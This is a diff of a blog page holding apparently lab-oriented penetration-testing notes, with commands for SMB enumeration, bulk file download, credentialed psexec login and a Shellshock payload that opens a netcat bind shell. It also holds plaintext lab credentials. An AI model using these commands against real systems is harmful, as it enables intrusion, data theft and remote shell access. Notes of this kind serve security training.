@@ -366,14 +366,14 @@ nmap -p- ">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-09-23
+                    2022-10-26
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.3k
+                    2.4k
                 </div>
                 
 
@@ -400,6 +400,11 @@ nmap -p- ">
         
 
         
+        <!-- 代码块折行 -->
+        <style type="text/css">
+            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
+        </style>
+        
 
         <div class="card-content article-card-content">
             <div id="articleContent">
@@ -425,7 +430,7 @@ dirb http://10.10.10.58:3000/ -a <span class="token string">"Mozilla/5.0 (Window
 
 dirbuster kali自带的扫描工具<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>/cgi-bin/ apache特有目录，可以对该目录继续爆破，查看是否有脚本文件</p>
-<h3 id="文件传输服务"><a href="#文件传输服务" class="headerlink" title="文件传输服务"></a>文件传输服务</h3><h4 id="smbclient命令"><a href="#smbclient命令" class="headerlink" title="smbclient命令"></a>smbclient命令</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">smbclient -L <span class="token number">10.10</span>.10.3      
+<h3 id="文件传输服务"><a href="#文件传输服务" class="headerlink" title="文件传输服务"></a>文件传输服务</h3><h4 id="sambda"><a href="#sambda" class="headerlink" title="sambda"></a>sambda</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">smbclient -L <span class="token number">10.10</span>.10.3      
 
 进入tmp目录
 smbclient //10.10.10.3/tmp
@@ -433,12 +438,25 @@ smbclient //10.10.10.3/tmp
 下载文件
 get 文件名
 
+下载所有文件
+开启递归下载
+smb: <span class="token punctuation">\</span><span class="token operator">></span> recurse on
+关闭提示
+smb: <span class="token punctuation">\</span><span class="token operator">></span> prompt off
+下载所有文件
+smb: <span class="token punctuation">\</span><span class="token operator">></span> mget *
+
 
 连接
 smbclient //10.10.10.59/ACCT -U Finance
 
 smb挂载到本地共享
-<span class="token function">mount</span> -t cifs -o <span class="token assign-left variable">user</span><span class="token operator">=</span>Finance,pass<span class="token operator">=</span>Acc0unting //10.10.10.59/ACCT /mnt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token function">mount</span> -t cifs -o <span class="token assign-left variable">user</span><span class="token operator">=</span>Finance,pass<span class="token operator">=</span>Acc0unting //10.10.10.59/ACCT /mnt
+
+查看文件夹权限
+smbmap -H <span class="token number">10.10</span>.10.100 
+指定用户名密码
+smbmap -H <span class="token number">10.10</span>.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h4 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">登陆110端口
 telnet <span class="token function">ip</span> <span class="token number">110</span>
 
@@ -535,6 +553,9 @@ Unable to negotiate with <span class="token number">10.10</span>.10.7 port <span
 
 共享枚举
 crackmapexec smb <span class="token number">10.10</span>.10.59 -u Finance -p Acc0unting --shares<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="psexec-py"><a href="#psexec-py" class="headerlink" title="psexec.py"></a>psexec.py</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">用于登陆windows机器
+<span class="token punctuation">[</span><span class="token punctuation">[</span>domain/<span class="token punctuation">]</span>username<span class="token punctuation">[</span>:password<span class="token punctuation">]</span>@<span class="token punctuation">]</span><span class="token operator">&lt;</span>targetName or address<span class="token operator">></span>
+python psexec.py Administrator:Ticketmaster1968@active.htb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h2 id="shellshock攻击cgi程序"><a href="#shellshock攻击cgi程序" class="headerlink" title="shellshock攻击cgi程序"></a>shellshock攻击cgi程序</h2><p> <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/35579956">https://zhuanlan.zhihu.com/p/35579956</a></p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> -A <span class="token string">"() &#123; :;&#125;;echo; /bin/nc -lp 10086 -c bash"</span> http://192.168.59.142/cgi-bin/file 
 （/cgi-bin/目录下的任意文件）
@@ -869,7 +890,7 @@ C:<span class="token punctuation">\</span>Users<span class="token punctuation">\
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/26/%E5%81%9A%E6%88%91%E7%9A%84%E5%96%B5/">
+                <a href="/2022/03/25/%E5%81%9A%E6%88%91%E7%9A%84%E5%96%B5/">
                     <div class="card-image">
                         
                         
@@ -886,7 +907,7 @@ C:<span class="token punctuation">\</span>Users<span class="token punctuation">\
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-26
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-25
                             </span>
                         <span class="publish-author">
                             
